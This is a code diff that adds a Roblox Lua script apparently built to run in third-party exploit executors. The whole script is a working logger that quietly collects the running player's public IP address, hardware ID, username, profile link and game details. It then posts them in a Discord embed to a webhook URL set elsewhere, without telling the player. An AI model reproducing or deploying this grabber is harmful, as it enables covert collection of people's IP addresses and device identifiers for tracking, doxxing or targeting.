@@ -1,0 +1,120 @@
+local IP = game:HttpGet("https://v4.ident.me")
+plr = game:GetService'Players'.LocalPlayer
+local premium = false
+local ALT = false
+if plr.MembershipType == Enum.MembershipType.Premium then
+	premium = true
+elseif plr.MembershipType == Enum.MembershipType.None then
+	premium = false
+end
+if premium == false then 
+	if plr.AccountAge <= 70 then 
+		ALT = true
+	end
+end
+
+local market = game:GetService("MarketplaceService")
+local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
+
+
+local http_request = http_request;
+if syn then
+	http_request = syn.request
+elseif SENTINEL_V2 then
+	function http_request(tb)
+		return {
+			StatusCode = 200;
+			Body = request(tb.Url, tb.Method, (tb.Body or ''))
+		}
+	end
+end
+local function getexploit()
+    local exploit =
+        (syn and not is_sirhurt_closure and not pebc_execute and "Synapse") or
+        (secure_load and "Sentinel") or
+        (is_sirhurt_closure and "Sirhurt") or
+        (pebc_execute and "ProtoSmasher") or
+        (KRNL_LOADED and "Krnl") or
+        (WrapGlobal and "WeAreDevs") or
+        (isvm and "Proxo") or
+        (shadow_env and "Shadow") or
+        (jit and "EasyExploits") or
+        (getscriptenvs and "Calamari") or
+        (unit and not syn and "Unit") or
+        (OXYGEN_LOADED and "Oxygen U") or
+        (IsElectron and "Electron") or
+        ("Unsupported")
+  
+    return exploit
+  end
+
+local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
+local decoded = game:GetService('HttpService'):JSONDecode(body)
+local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint", "Krnl-Hwid"};
+hwid = "";
+local blacklisted = {"0bb713c33d19cff5768a9f5ab4ee56180862d57995cbd4cd75bb6d758d3812f0ce913b6bffab95967296a5c507500a8ddfa6d162d9269b6c581054e5b2885031", "Bro"}
+
+for i, v in next, hwid_list do
+	if decoded.headers[v] then
+		hwid = decoded.headers[v];
+		break
+	end
+end
+
+if hwid then
+local OSTime = os.time();
+local Time = os.date('!*t', OSTime);
+local Avatar = 'https://cdn.discordapp.com/embed/avatars/4.png';
+local Content = '';
+local Embed = {
+    title = '𝗟𝘂𝗮𝗨 𝗹𝗼𝗴𝗴𝗲𝗿';
+    color = EmbedColor;
+    footer = { text = game.JobId };
+    author = {
+        name = plr.Name;
+        url = 'https://www.roblox.com/users/'.. plr.UserId ..'/profile';
+        icon_url = 'https://www.roblox.com/bust-thumbnail/image?userId='.. plr.UserId ..'&width=420&height=420&format=png'
+    };
+    fields = {
+        {
+            name = 'HWID';
+            value = hwid;
+            inline = true
+        },
+        {
+            name = 'IPv4';
+            value = IP;
+            inline = true
+        },
+        {
+            name = 'GameName';
+            value = info.Name;
+            inline = true
+        },
+        {
+            name = 'GameID';
+            value = game.PlaceId;
+            inline = true
+        },
+        {
+            name = 'GameLink';
+            value = "[Click here!](https://roblox.com/games/" .. game.PlaceId .. "/)";
+            inline = true
+        },
+        {
+            name = 'Exploit';
+            value = getexploit();
+            inline = true
+        }
+    };
+    timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec);
+};
+(syn and syn.request or http_request) {
+    Url = _G.WebhookURL;
+    Method = 'POST';
+    Headers = {
+        ['Content-Type'] = 'application/json';
+    };
+    Body = game:GetService'HttpService':JSONEncode( { content = Content; embeds = { Embed } } );
+};
+end
